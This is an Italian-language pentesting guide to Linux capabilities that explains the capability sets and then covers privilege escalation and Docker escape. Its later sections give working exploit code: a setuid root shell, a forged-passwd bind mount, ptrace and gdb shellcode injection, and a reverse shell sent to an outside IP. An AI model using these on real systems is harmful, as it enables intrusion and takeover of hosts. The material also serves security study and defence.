# Linux Capabilities

{{#include ../../banners/hacktricks-training.md}}

Le Linux capabilities suddividono i **privilegi di root in unità più piccole e distinte**, consentendo ai processi di avere un sottoinsieme di privilegi. In questo modo si riducono i rischi, evitando di concedere inutilmente tutti i privilegi di root.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[14]](#references)</sup>

### Il problema:

- Gli utenti normali hanno permessi limitati per operazioni come aprire raw socket o associare porte Internet inferiori a 1024; le capabilities possono concedere solo l'operazione necessaria, invece di tutti i privilegi di root.<sup>[[14]](#references)</sup>

### Insiemi di capabilities:

Linux espone questi insiemi di capabilities per thread e il kernel applica i relativi vincoli quando un processo cambia credenziali o esegue un file.<sup>[[14]](#references)</sup>

1. **Ereditato (CapInh)**:

   - **Scopo**: identifica le capabilities che possono contribuire all'insieme consentito dopo `execve()` quando il file eseguito ha capabilities di file ereditabili corrispondenti.
   - **Funzionalità**: l'insieme ereditabile del thread viene mantenuto attraverso `execve()`; da solo non rende effettive tali capabilities.
   - **Restrizioni**: l'aggiunta di una capability a questo insieme è vincolata dagli insiemi consentito e di bounding.<sup>[[14]](#references)</sup>

2. **Effettivo (CapEff)**:

   - **Scopo**: rappresenta le capabilities che un processo sta effettivamente utilizzando in un dato momento.
   - **Funzionalità**: è l'insieme di capabilities che il kernel verifica per concedere i permessi per varie operazioni. Per i file, questo insieme può essere un flag che indica se le capabilities consentite del file debbano essere considerate effettive.
   - **Significato**: l'insieme effettivo è fondamentale per i controlli immediati dei privilegi e costituisce l'insieme attivo di capabilities utilizzabili da un processo.

3. **Consentito (CapPrm)**:

   - **Scopo**: definisce l'insieme massimo di capabilities che un processo può possedere.
   - **Funzionalità**: un processo può spostare una capability dall'insieme consentito a quello effettivo, ottenendo così la possibilità di usarla. Può anche eliminare capabilities dal proprio insieme consentito.
   - **Limite**: se una capability viene eliminata da questo insieme, normalmente non può essere ripristinata senza eseguire un file che la conceda o effettuare un'altra transizione privilegiata.<sup>[[14]](#references)</sup>

4. **Bounding (CapBnd)**:

   - **Scopo**: limita le capabilities che un processo può ottenere da un file durante `execve()` e quelle che può aggiungere al proprio insieme ereditabile.
   - **Funzionalità**: l'insieme viene ereditato attraverso `fork()` e mantenuto attraverso `execve()`; le capabilities possono essere eliminate da esso se il chiamante dispone di `CAP_SETPCAP`.
   - **Caso d'uso**: rimuovere le capabilities non necessarie da questo insieme limita la successiva acquisizione di privilegi.<sup>[[14]](#references)</sup>

5. **Ambient (CapAmb)**:
   - **Scopo**: consente a capabilities selezionate di rimanere consentite ed effettive attraverso `execve()` di un programma non privilegiato.
   - **Funzionalità**: le capabilities ambient vengono aggiunte ai nuovi insiemi consentito ed effettivo quando il file eseguito non è privilegiato.
   - **Restrizioni**: una capability può essere ambient solo se è presente sia negli insiemi consentito che ereditabile; l'esecuzione di un file set-user-ID/set-group-ID o di un file con capabilities azzera l'insieme ambient.<sup>[[8]](#references)[[9]](#references)[[14]](#references)</sup>

## Capabilities di processi e binari

### Capabilities dei processi

Per visualizzare le capabilities di un determinato processo, usa il file **status** nella directory /proc. Poiché contiene più dettagli, limitiamoci alle informazioni relative alle Linux capabilities.\
Nota che, per tutti i processi in esecuzione, le informazioni sulle capabilities sono mantenute per thread, mentre le capabilities dei file sono memorizzate negli attributi estesi `security.capability`.<sup>[[14]](#references)[[15]](#references)</sup>

Puoi trovare le capabilities definite in /usr/include/linux/capability.h

Puoi trovare le capabilities del processo corrente in `cat /proc/self/status` o con `capsh --print`, e quelle di altri processi in `/proc/<pid>/status`.<sup>[[15]](#references)[[26]](#references)</sup>

```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```

Questo comando dovrebbe restituire cinque righe relative alle capability sulla maggior parte dei sistemi.<sup>[[15]](#references)</sup>

- CapInh = Capability ereditate
- CapPrm = Capability consentite
- CapEff = Capability effettive
- CapBnd = Set di limitazione
- CapAmb = Set di capability ambientali

```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```

Questi numeri esadecimali non hanno senso. Usando l'utilità `capsh`, possiamo decodificarli nei nomi delle capability.<sup>[[26]](#references)</sup>

```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```

Controlliamo ora le **capabilities** utilizzate da `ping`:

```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```

Sebbene funzioni, esiste un altro metodo più semplice. Per visualizzare le capabilities di un processo in esecuzione, usa lo strumento **getpcaps** seguito dal suo ID di processo (PID); accetta anche un elenco di ID di processo.<sup>[[22]](#references)</sup>

```bash
getpcaps 1234
```

Verifichiamo le capability di `tcpdump` dopo aver assegnato al binario `cap_net_admin` e `cap_net_raw` per sniffare il traffico di rete (`tcpdump` è in esecuzione nel processo 9562).<sup>[[22]](#references)[[25]](#references)</sup>

```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```

Come puoi vedere, le capability corrispondono ai risultati dei due metodi per ispezionare un processo. Lo strumento `getpcaps` usa libcap per interrogare le capability di un processo target e le stampa in formato testuale; accetta uno o più PID.<sup>[[22]](#references)</sup>

### Capability dei binari

I binari possono avere file capability applicate durante l'esecuzione. Per esempio, un binario `ping` può avere la capability `cap_net_raw`.<sup>[[14]](#references)</sup>

```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```

Puoi **cercare i binari con capabilities** usando `getcap -r`.<sup>[[23]](#references)</sup>

```bash
getcap -r / 2>/dev/null
```

### Rimozione delle capabilities con capsh

Se rimuoviamo `CAP_NET_RAW` dal bounding set prevalente, un programma che necessita di questa capability non dovrebbe più essere in grado di usarla.<sup>[[26]](#references)</sup>

```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```

Oltre all'output di _capsh_, anche il comando _tcpdump_ dovrebbe generare un errore.

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

L'errore indica che `tcpdump` non può essere eseguito con la capability del file richiesta dopo che `CAP_NET_RAW` è stata rimossa dal bounding set.

### Rimuovere le capabilities

Puoi rimuovere le capabilities di un file con `setcap -r`.<sup>[[25]](#references)</sup>

```bash
setcap -r </path/to/binary>
```

## Capabilities degli utenti

Linux non assegna direttamente capabilities dei file agli utenti che effettuano l’accesso, ma il modulo PAM `pam_cap` può impostare capabilities ereditabili per le sessioni autenticate usando `/etc/security/capability.conf`.<sup>[[16]](#references)</sup> Ogni voce associa nomi o numeri di capability separati da virgole a uno o più nomi utente.<sup>[[17]](#references)</sup>
Esempio di file:

```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```

## Capabilities dell'ambiente

Compilando il seguente programma è possibile **avviare una shell bash all'interno di un ambiente che fornisce capabilities**.<sup>[[14]](#references)</sup>

```c:ambient.c
/*
 * Test program for the ambient capabilities
 *
 * compile using:
 * gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
 * Set effective, inherited and permitted capabilities to the compiled binary
 * sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
 *
 * To get a shell with additional caps that can be inherited do:
 *
 * ./ambient /bin/bash
 */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
  int rc;
  capng_get_caps_process();
  rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
  if (rc) {
    printf("Cannot add inheritable cap\n");
    exit(2);
  }
  capng_apply(CAPNG_SELECT_CAPS);
  /* Note the two 0s at the end. Kernel checks for these */
  if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
    perror("Cannot set cap");
    exit(1);
  }
}
void usage(const char * me) {
  printf("Usage: %s [-c caps] new-program new-args\n", me);
  exit(1);
}
int default_caplist[] = {
  CAP_NET_RAW,
  CAP_NET_ADMIN,
  CAP_SYS_NICE,
  -1
};
int * get_caplist(const char * arg) {
  int i = 1;
  int * list = NULL;
  char * dup = strdup(arg), * tok;
  for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
    list = realloc(list, (i + 1) * sizeof(int));
    if (!list) {
      perror("out of memory");
      exit(1);
    }
    list[i - 1] = atoi(tok);
    list[i] = -1;
    i++;
  }
  return list;
}
int main(int argc, char ** argv) {
  int rc, i, gotcaps = 0;
  int * caplist = NULL;
  int index = 1; // argv index for cmd to start
  if (argc < 2)
    usage(argv[0]);
  if (strcmp(argv[1], "-c") == 0) {
    if (argc <= 3) {
      usage(argv[0]);
    }
    caplist = get_caplist(argv[2]);
    index = 3;
  }
  if (!caplist) {
    caplist = (int * ) default_caplist;
  }
  for (i = 0; caplist[i] != -1; i++) {
    printf("adding %d to ambient list\n", caplist[i]);
    set_ambient_cap(caplist[i]);
  }
  printf("Ambient forking shell\n");
  if (execv(argv[index], argv + index))
    perror("Cannot exec");
  return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```

All'interno di **bash eseguita dal binario ambient compilato**, è possibile osservare le **nuove capabilities** (un utente normale non avrà alcuna capability nella sezione "current").<sup>[[14]](#references)</sup>

```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```

> [!CAUTION]
> Puoi **aggiungere solo capability presenti** sia nell’insieme permitted sia in quello inheritable.<sup>[[14]](#references)</sup>

### Binari capability-aware/capability-dumb

Un binario capability-dumb è un programma con file capability che non usa libcap per gestirle. Se è impostato il bit effective del file, il kernel abilita le capability permitted del file nell’insieme effective del processo; l’esecuzione può fallire se il processo non ha ottenuto tutte le capability permitted.<sup>[[14]](#references)</sup>

## Capability dei servizi

Un servizio di sistema eseguito come root può mantenere capability ampie, a meno che il suo ambiente di esecuzione non le limiti. In un’unità systemd, `User=` seleziona l’utente del servizio e `AmbientCapabilities=` aggiunge le capability indicate all’insieme ambient del processo eseguito.<sup>[[18]](#references)</sup>

```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```

## Capacità nei container Docker

Docker avvia i container con un set predefinito di capability, che può essere modificato con `--cap-add` e `--cap-drop`; un container di esempio può essere esaminato con `amicontained`.<sup>[[19]](#references)[[24]](#references)</sup>

```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
	BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```

## Privesc/Container Escape

Le capabilities sono utili quando **si vuole limitare i propri processi dopo aver eseguito operazioni privilegiate** (ad es. dopo aver configurato chroot e associato un socket). Tuttavia, possono essere sfruttate passando loro comandi o argomenti malevoli, che vengono poi eseguiti come root.<sup>[[2]](#references)</sup>

È possibile forzare le file capabilities sui programmi con `setcap` e interrogarle con `getcap`.<sup>[[23]](#references)[[25]](#references)</sup>

```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```

Per il testo delle capability dei file, `+ep` aggiunge la capability indicata agli insiemi effettivo e consentito; `-` rimuove i flag selezionati.<sup>[[21]](#references)</sup>

Per identificare i programmi con capability in un sistema o in una cartella, usa `getcap -r`.<sup>[[23]](#references)</sup>

```bash
getcap -r / 2>/dev/null
```

### Esempio di exploitation

Nell'esempio seguente, il binario `/usr/bin/python2.6` risulta vulnerabile a privesc:

```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```

**Capabilities** necessarie a `tcpdump` per **consentire a qualsiasi utente di sniffare pacchetti**:

```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```

### Il caso particolare di un nome di capability omesso

Nel formato testuale di libcap, `getcap myelf` che restituisce `myelf =ep` significa che **tutte le capability** sono contrassegnate come effettive e consentite, nei limiti del bounding set, dello user namespace e delle altre restrizioni di esecuzione del processo che le esegue. Il set di capability vuoto di un file è `myelf =` (senza `e` o `p`); è diverso da un file senza attributo di capability. Un file `=ep` non cambia di per sé l'UID del processo in root, ma un programma in grado di usare `CAP_DAC_READ_SEARCH` o `CAP_DAC_OVERRIDE` può leggere file che altrimenti non potrebbe leggere con il proprio UID Unix. Prima di considerare le opzioni di input del programma come un percorso di lettura privilegiata dei file, verifica i permessi effettivi dell'eseguibile, il namespace e le capability effettive. Consulta il [formato testuale delle capability](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html) di libcap e il [comportamento dei valori vuoti](https://man7.org/linux/man-pages/man8/getcap.8.html).<sup>[[14]](#references)</sup>

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** è una capability Linux molto potente, spesso equiparata a un livello quasi equivalente a root per via degli ampi **privilegi amministrativi** che concede, come montare dispositivi o manipolare funzionalità del kernel. Sebbene sia indispensabile per i container che simulano interi sistemi, **`CAP_SYS_ADMIN` comporta notevoli rischi per la sicurezza**, soprattutto negli ambienti containerizzati, a causa del suo potenziale di escalation dei privilegi e compromissione del sistema. Il suo utilizzo richiede quindi rigorose valutazioni di sicurezza e una gestione cauta; è preferibile rimuovere questa capability dai container specifici per le applicazioni, rispettando il **principio del privilegio minimo** e riducendo al minimo la superficie di attacco.<sup>[[14]](#references)</sup>

Per i cambi di namespace, l'ambito è importante: `setns()` verifica `CAP_SYS_ADMIN` rispetto allo user namespace proprietario del namespace di destinazione. Per entrare in un mount namespace è inoltre necessario disporre di `CAP_SYS_CHROOT` nello user namespace del chiamante. Una capability posseduta solo all'interno di uno user namespace privato rimappato non consente quindi di entrare arbitrariamente nei namespace iniziali dell'host.<sup>[[14]](#references)</sup>

**Esempio con un binario**

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```

Usando Python puoi montare un file _passwd_ modificato sopra il file _passwd_ reale:

```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```

E infine **monta** il file `passwd` modificato su `/etc/passwd`:

```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```

E potrai fare **`su` come root** usando la password "password".

**Esempio con ambiente (Docker breakout)**

Puoi verificare le capabilities abilitate all'interno del container Docker usando:

```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

Nel risultato precedente puoi vedere che la capability SYS_ADMIN è abilitata.<sup>[[14]](#references)</sup>

- **Mount**

Con un accesso adeguato al device e al namespace, ciò può consentire a un container Docker di **montare un disco host e accedere ai suoi contenuti**. Il device node deve rappresentare un dispositivo host reale, il device cgroup deve consentirne l’accesso e, per montare un filesystem basato su block device, è necessario disporre di `CAP_SYS_ADMIN` nell’initial user namespace.<sup>[[14]](#references)</sup>

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/sda1 # Replace with the validated filesystem partition or LV.
mkdir -p /mnt/host
mount -o ro "${node_root_device}" /mnt/host
cat /mnt/host/etc/hostname
umount /mnt/host
```

- **Accesso completo**

Con il metodo precedente siamo riusciti ad accedere a un disco dell’host.\
Se l’host esegue un server **ssh**, puoi **creare un utente all’interno del disco montato** e accedervi tramite SSH.<sup>[[14]](#references)</sup>

```bash
#Like in the example before, the first step is to mount the docker host disk
node_root_device=/dev/sda1
mount "${node_root_device}" /mnt/host

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/host adduser john
ssh john@172.17.0.1 -p 2222
```

Le letture e le scritture dirette in `/mnt/host` consentono già l'accesso al filesystem dell'host. Il `chroot` finale è solo una comodità per i percorsi e richiede inoltre `CAP_SYS_CHROOT`; non è il passaggio che crea l'escape.

## CAP_SYS_PTRACE

Con `CAP_SYS_PTRACE`, un processo può tracciare e ispezionare altri processi visibili nel proprio PID namespace. Per raggiungere i processi dell'host da un container Docker, condividi il PID namespace dell'host con `--pid=host` (oppure entra in un namespace che contiene il processo target).<sup>[[14]](#references)[[20]](#references)</sup>

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** consente di usare le funzionalità di debugging e di tracing delle system call fornite da `ptrace(2)` e le chiamate di accesso alla memoria tra processi, come `process_vm_readv(2)` e `process_vm_writev(2)`. Sebbene sia utile per attività di diagnostica e monitoraggio, se `CAP_SYS_PTRACE` è abilitata senza misure restrittive come un filtro seccomp su `ptrace(2)`, può compromettere notevolmente la sicurezza del sistema. In particolare, può essere sfruttata per aggirare altre restrizioni di sicurezza, in particolare quelle imposte da seccomp, come dimostrano [proof of concept (PoC) come questo](https://gist.github.com/thejh/8346f47e359adecd1d53).<sup>[[10]](#references)</sup>

**Esempio con un binario (python)**

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
    _fields_ = [
        ("r15", ctypes.c_ulonglong),
        ("r14", ctypes.c_ulonglong),
        ("r13", ctypes.c_ulonglong),
        ("r12", ctypes.c_ulonglong),
        ("rbp", ctypes.c_ulonglong),
        ("rbx", ctypes.c_ulonglong),
        ("r11", ctypes.c_ulonglong),
        ("r10", ctypes.c_ulonglong),
        ("r9", ctypes.c_ulonglong),
        ("r8", ctypes.c_ulonglong),
        ("rax", ctypes.c_ulonglong),
        ("rcx", ctypes.c_ulonglong),
        ("rdx", ctypes.c_ulonglong),
        ("rsi", ctypes.c_ulonglong),
        ("rdi", ctypes.c_ulonglong),
        ("orig_rax", ctypes.c_ulonglong),
        ("rip", ctypes.c_ulonglong),
        ("cs", ctypes.c_ulonglong),
        ("eflags", ctypes.c_ulonglong),
        ("rsp", ctypes.c_ulonglong),
        ("ss", ctypes.c_ulonglong),
        ("fs_base", ctypes.c_ulonglong),
        ("gs_base", ctypes.c_ulonglong),
        ("ds", ctypes.c_ulonglong),
        ("es", ctypes.c_ulonglong),
        ("fs", ctypes.c_ulonglong),
        ("gs", ctypes.c_ulonglong),
    ]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
    # Convert the byte to little endian.
    shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
    shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
    shellcode_byte=int(shellcode_byte_little_endian,16)

    # Inject the byte.
    libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```

**Esempio con un binario**

`gdb` con la capability `ptrace`:

```
/usr/bin/gdb = cap_sys_ptrace+ep
```

Una capability su un debugger è solo un indizio da approfondire. Verifica se il processo corrente può eseguire quel file esatto (incluse le autorizzazioni di gruppo e ACL), se `CAP_SYS_PTRACE` è effettiva dopo l'esecuzione e se un target con privilegi superiori è visibile e consente l'attach nello stesso namespace PID. `no_new_privs`, un mount `nosuid`, il capability bounding set, Yama, seccomp o un LSM possono modificare il risultato. Consulta [`capabilities(7)`](https://man7.org/linux/man-pages/man7/capabilities.7.html) e la [documentazione di Yama del kernel](https://docs.kernel.org/admin-guide/LSM/Yama.html). Elenca i metadati di file e processi senza eseguire l'attach a un target.

Crea una shellcode con msfvenom da iniettare in memoria tramite gdb

```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
	chunk = payload[i:i+8][::-1]
	chunks = "0x"
	for byte in chunk:
		chunks += f"{byte:02x}"

	print(f"set {{long}}($rip+{i}) = {chunks}")
```

Esegui il debug di un processo root con gdb e copia-incolla le righe di gdb generate in precedenza:

```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```

**Esempio con environment (Docker breakout) - Un altro abuso di gdb**

Se **GDB** è installato (oppure puoi installarlo, ad esempio con `apk add gdb` o `apt install gdb`), puoi **eseguire il debug di un processo host visibile** e fargli chiamare la funzione `system`. È necessario disporre di `CAP_SYS_PTRACE` effettiva nello user namespace del target e poter vedere i PID dell'host; **non** è necessario disporre di `CAP_SYS_ADMIN`. Yama, lo stato non dumpable, seccomp e le policy LSM possono comunque impedire l'attach.

```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```

Non potrai vedere l'output del comando eseguito, ma verrà eseguito da quel processo (quindi ottieni una rev shell).

> [!WARNING]
> Se ricevi l'errore "No symbol "system" in current context.", controlla l'esempio precedente in cui viene caricato uno shellcode in un programma tramite gdb.

**Esempio con variabili d'ambiente (Docker breakout) - Shellcode Injection**

Puoi controllare le capabilities abilitate all'interno del container Docker usando:

```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```

Elenca i **processi** in esecuzione nell'**host** `ps -eaf`

1. Rileva l'**architettura** `uname -m`
2. Trova uno **shellcode** per l'architettura ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Trova un **programma** per **inject**-are lo **shellcode** nella memoria di un processo ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. **Modifica** lo **shellcode** all'interno del programma e **compilalo** `gcc inject.c -o inject`
5. **Inject**-alo e ottieni la tua **shell**: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** consente a un processo di **caricare e scaricare moduli del kernel (system call `init_module(2)`, `finit_module(2)` e `delete_module(2)`)**, offrendo accesso diretto alle operazioni fondamentali del kernel. Questa capability comporta rischi critici per la sicurezza, perché il caricamento di un modulo può modificare il comportamento del kernel e compromettere i confini di isolamento.<sup>[[6]](#references)[[14]](#references)</sup>
